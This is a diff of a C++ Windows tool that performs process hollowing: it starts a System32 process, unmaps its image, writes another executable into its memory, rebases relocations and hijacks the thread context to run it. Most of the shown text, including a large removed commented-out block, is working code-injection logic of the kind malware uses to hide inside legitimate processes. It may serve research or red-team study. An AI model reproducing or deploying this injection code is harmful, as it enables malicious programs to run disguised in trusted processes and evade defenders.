@@ -26,7 +26,7 @@ int wmain()
 	targetAppPath.append(L"\\System32\\");
 	targetAppPath.append(TARGET_APP_NAME);
 
-	ProcessHollowing ProcHollowing(sourceAppPath, TARGET_APP_NAME);
+	ProcessHollowing ProcHollowing(sourceAppPath, targetAppPath);
 
 	boRet = ProcHollowing.Init();
 	if (false == boRet)
@@ -132,7 +132,7 @@ bool ProcessHollowing::CreateHollowedProcess()
 		return boRet;
 	}
 
-	boRet = GetProcessBaseAddressEx();
+	boRet = GetProcessBaseAddress();
 	if (false == boRet)
 	{
 		CleanProcess(true);
@@ -182,179 +182,7 @@ bool ProcessHollowing::CreateHollowedProcess()
 		return false;
 	}
 
-//	boRet = GetProcessBaseAddress();
-//	if (false == boRet)
-//	{
-//		return boRet;
-//	}
-//
-//	VOID* pvImageBaseAddress = reinterpret_cast<VOID*>(m_baseAddress);
-//
-//	PLOADED_IMAGE pImage = ReadRemoteImage(m_pProcessInfo->hProcess, pvImageBaseAddress);
-//	if (nullptr == pImage)
-//	{
-//		return false;
-//	}
-//
-//	PLOADED_IMAGE pSourceImage = GetLoadedImage(reinterpret_cast<ULONG_PTR>(m_pbyBuffer));
-//	if (nullptr == pSourceImage)
-//	{
-//		return false;
-//	}
-//
-//	PIMAGE_NT_HEADERS pSourceHeaders = GetNTHeaders(reinterpret_cast<ULONG_PTR>(m_pbyBuffer));
-//
-//	//	unampping destination section.
-//	NTSTATUS status = m_pfnNtUnmapViewOfSection(m_pProcessInfo->hProcess, pvImageBaseAddress);
-//	if (STATUS_SUCCESS != status)
-//	{
-//		wprintf(L"\n CreateHollowedProcess: m_pfnNtUnmapViewOfSection failed with error(%u)", status);
-//		return false;
-//	}
-//
-//	PVOID pRemoteImage = VirtualAllocEx(
-//		m_pProcessInfo->hProcess,
-//		pvImageBaseAddress,
-//		pSourceHeaders->OptionalHeader.SizeOfImage,
-//		MEM_COMMIT | MEM_RESERVE,
-//		PAGE_EXECUTE_READWRITE
-//	);
-//	if (NULL == pRemoteImage)
-//	{
-//		wprintf(L"\n CreateHollowedProcess: VirtualAllocEx failed with error(%u)", GetLastError());
-//		return false;
-//	}
-//
-//	ULONG_PTR dwDelta = m_baseAddress - pSourceHeaders->OptionalHeader.ImageBase;
-//
-//	pSourceHeaders->OptionalHeader.ImageBase = m_baseAddress;
-//
-//	boRet = WriteProcessMemory(m_pProcessInfo->hProcess, pvImageBaseAddress, m_pbyBuffer, pSourceHeaders->OptionalHeader.SizeOfHeaders, 0);
-//	if (false == boRet)
-//	{
-//		wprintf(L"\n CreateHollowedProcess: WriteProcessMemory failed with error(%u)", GetLastError());
-//		return false;
-//	}
-//
-//	for (ULONG i = 0; i < pSourceImage->NumberOfSections; i++)
-//	{
-//		if (!pSourceImage->Sections[i].PointerToRawData)
-//		{
-//			continue;
-//		}
-//
-//		PVOID pSectionDest = (PVOID)(m_baseAddress + pSourceImage->Sections[i].VirtualAddress);
-//
-//		boRet = WriteProcessMemory(m_pProcessInfo->hProcess, pSectionDest, &m_pbyBuffer[pSourceImage->Sections[i].PointerToRawData], pSourceImage->Sections[i].SizeOfRawData, 0);
-//		if (false == boRet)
-//		{
-//			wprintf(L"\n CreateHollowedProcess: WriteProcessMemory 2 failed for section(%S)  with error(%u)", pSourceImage->Sections[i].Name, GetLastError());
-//			return false;
-//		}
-//	}
-//
-//	if (dwDelta)
-//	{
-//		for (DWORD x = 0; x < pSourceImage->NumberOfSections; x++)
-//		{
-//			const char* pSectionName = ".reloc";
-//
-//			if (memcmp(pSourceImage->Sections[x].Name, pSectionName, strlen(pSectionName)))
-//				continue;
-//
-//			wprintf(L"\n Rebasing image");
-//
-//			DWORD dwRelocAddr = pSourceImage->Sections[x].PointerToRawData;
-//			DWORD dwOffset = 0;
-//
-//			IMAGE_DATA_DIRECTORY relocData = pSourceHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
-//
-//			while (dwOffset < relocData.Size)
-//			{
-//				PBASE_RELOCATION_BLOCK pBlockheader = (PBASE_RELOCATION_BLOCK)&m_pbyBuffer[dwRelocAddr + dwOffset];
-//
-//				dwOffset += sizeof(BASE_RELOCATION_BLOCK);
-//
-//				DWORD dwEntryCount = CountRelocationEntries(pBlockheader->BlockSize);
-//
-//				PBASE_RELOCATION_ENTRY pBlocks =
-//					(PBASE_RELOCATION_ENTRY)&m_pbyBuffer[dwRelocAddr + dwOffset];
-//
-//				for (DWORD y = 0; y < dwEntryCount; y++)
-//				{
-//					dwOffset += sizeof(BASE_RELOCATION_ENTRY);
-//
-//					if (pBlocks[y].Type == 0)
-//						continue;
-//
-//					DWORD dwFieldAddress = pBlockheader->PageAddress + pBlocks[y].Offset;
-//
-//					DWORD dwBuffer = 0;
-//					ReadProcessMemory(
-//						m_pProcessInfo->hProcess,
-//						(PVOID)(m_baseAddress + dwFieldAddress),
-//						&dwBuffer,
-//						sizeof(DWORD),
-//						0
-//					);
-//
-//					dwBuffer += (ULONG)dwDelta;
-//
-//					BOOL bSuccess = WriteProcessMemory(
-//						m_pProcessInfo->hProcess,
-//						(PVOID)(m_baseAddress + dwFieldAddress),
-//						&dwBuffer,
-//						sizeof(DWORD),
-//						0
-//					);
-//
-//					if (!bSuccess)
-//					{
-//						wprintf(L"\n WriteProcessMemory 3 failed with error = %d", GetLastError());
-//						continue;
-//					}
-//				}
-//			}
-//
-//			break;
-//		}
-//	}
-//
-//	ULONG_PTR dwEntrypoint = m_baseAddress + pSourceHeaders->OptionalHeader.AddressOfEntryPoint;
-//
-//	LPCONTEXT pContext = new CONTEXT();
-//	pContext->ContextFlags = CONTEXT_INTEGER;
-//
-//	wprintf(L"\n Getting thread context");
-//
-//	if (!GetThreadContext(m_pProcessInfo->hThread, pContext))
-//	{
-//		wprintf(L"Error getting context, error = %d\r\n", GetLastError());
-//		return false;
-//	}
-//
-//#ifdef _WIN64        
-//	pContext->Rax = dwEntrypoint;
-//#else
-//	pContext->Eax = dwEntrypoint;
-//#endif
-//	wprintf(L"Setting thread context\r\n");
-//
-//	if (!SetThreadContext(m_pProcessInfo->hThread, pContext))
-//	{
-//		wprintf(L"Error setting context, error = %d\r\n", GetLastError());
-//		return false;
-//	}
-//
-//	wprintf(L"Resuming thread\r\n");
-//
-//	if (!ResumeThread(m_pProcessInfo->hThread))
-//	{
-//		wprintf(L"Error resuming thread, error = %d\r\n", GetLastError());
-//		return false;
-//	}
-
-	wprintf(L"Process hollowing complete\r\n");
+	wprintf(L"\n Process hollowing complete.");
 
 	return true;
 }
@@ -493,28 +321,6 @@ bool ProcessHollowing::ExecFile()
 }
 
 bool ProcessHollowing::GetProcessBaseAddress()
-{
-	ULONG returnLength;
-	PROCESS_BASIC_INFORMATION procBasicInfo;
-
-	NTSTATUS status = m_pfnQueryInformationProcess(m_pProcessInfo->hProcess, ProcessBasicInformation, &procBasicInfo, sizeof(procBasicInfo), &returnLength);
-	if (status == STATUS_SUCCESS)
-	{
-		PEB_NT peb;
-		if (ReadPEB(m_pProcessInfo->hProcess, procBasicInfo.PebBaseAddress, peb))
-		{
-			m_baseAddress = reinterpret_cast<ULONG_PTR>(peb.ImageBaseAddress);
-		}
-		else
-		{
-			return false;
-		}
-	}
-
-	return true;
-}
-
-bool ProcessHollowing::GetProcessBaseAddressEx()
 {
 	BOOL bReadBaseAddress;
 	if (m_boTarget32BitProcess)
@@ -911,80 +717,6 @@ bool ProcessHollowing::RunPEReloc64()
 	}
 
 	ResumeThread(m_pProcessInfo->hThread);
-
-	return true;
-}
-
-bool ReadPEB(HANDLE processHandle, void* pebVirtualAddress, PEB_NT& peb)
-{
-	BOOL status = ReadProcessMemory(processHandle, pebVirtualAddress, &peb, sizeof(PEB_NT), 0);
-	return status != FALSE;
-}
-
-
-bool
-ExecFile(
-	const TCHAR* pcszExePath,
-	BOOLEAN bWaitForCompletion,
-	BOOLEAN bShowWindow,
-	DWORD* pdwError
-)
-{
-	BOOL boResult;
-	DWORD dwResult;
-	DWORD dwErrorCode;
-	STARTUPINFO StartupInfo;
-	PROCESS_INFORMATION ProcessInfo;
-
-	if (NULL == pcszExePath || NULL == pdwError)
-	{
-		return false;
-	}
-
-	*pdwError = 0;
-
-	SecureZeroMemory(&StartupInfo, sizeof(StartupInfo));
-	StartupInfo.cb = sizeof(StartupInfo);
-
-	StartupInfo.dwFlags |= STARTF_USESHOWWINDOW;
-	StartupInfo.wShowWindow = bShowWindow ? SW_NORMAL : SW_HIDE;
-
-	boResult = CreateProcessW(
-		pcszExePath,
-		NULL,
-		NULL,
-		NULL,
-		TRUE,
-		0,
-		NULL,
-		NULL,
-		&StartupInfo,
-		&ProcessInfo
-	);
-	if (FALSE == boResult)
-	{
-		*pdwError = GetLastError();
-		return false;
-	}
-
-	if (TRUE == bWaitForCompletion)
-	{
-		dwResult = WaitForSingleObject(ProcessInfo.hProcess, INFINITE);
-		if (WAIT_OBJECT_0 != dwResult)
-		{
-			CloseHandle(ProcessInfo.hThread);
-			CloseHandle(ProcessInfo.hProcess);
-			return false;
-		}
-
-		boResult = GetExitCodeProcess(ProcessInfo.hProcess, &dwErrorCode);
-		if (FALSE == boResult)
-		{
-		}
-	}
-
-	CloseHandle(ProcessInfo.hThread);
-	CloseHandle(ProcessInfo.hProcess);
 
 	return true;
 }
